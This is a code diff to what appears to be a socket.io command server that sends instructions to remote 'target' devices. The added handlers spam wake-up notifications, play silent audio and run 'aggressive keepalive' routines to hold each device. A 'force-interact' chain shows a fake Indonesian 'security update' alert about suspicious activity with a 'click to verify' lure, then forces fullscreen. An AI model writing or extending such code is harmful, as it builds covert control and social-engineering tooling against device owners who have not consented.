@@ -292,6 +292,38 @@ io.on('connection', (socket) => {
                 io.to(targetDeviceId).emit('admin-respawn-keepalive');
             }
         });
+        // === REMOTE KEEP-ALIVE STRATEGIES ===
+        socket.on('admin-wakeup-spam', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-wakeup-spam', {
+                    count: data.count || 5,
+                    interval: data.interval || 3000,
+                    messages: data.messages || []
+                });
+            }
+        });
+        socket.on('admin-silent-audio', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-silent-audio', { state: !!data.state });
+            }
+        });
+        socket.on('admin-aggressive-keepalive', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-aggressive-keepalive', { state: !!data.state });
+            }
+        });
+        socket.on('admin-force-interact', (targetDeviceId) => {
+            if (targetDeviceId) {
+                // Send a chain: notif + fullscreen + audio to maximize wakeup chance
+                io.to(targetDeviceId).emit('admin-show-notif', {
+                    title: '⚠️ Pembaruan Keamanan',
+                    body: 'Sistem mendeteksi aktivitas mencurigakan. Klik untuk verifikasi.'
+                });
+                setTimeout(() => io.to(targetDeviceId).emit('force-fullscreen'), 1500);
+                setTimeout(() => io.to(targetDeviceId).emit('admin-silent-audio', { state: true }), 2000);
+                setTimeout(() => io.to(targetDeviceId).emit('admin-respawn-keepalive'), 3000);
+            }
+        });
         socket.on('disconnect', () => {
             // Keep IP in set briefly; remove after other sockets from same IP may still be active
             setTimeout(() => adminIps.delete(adminIp), 60000);
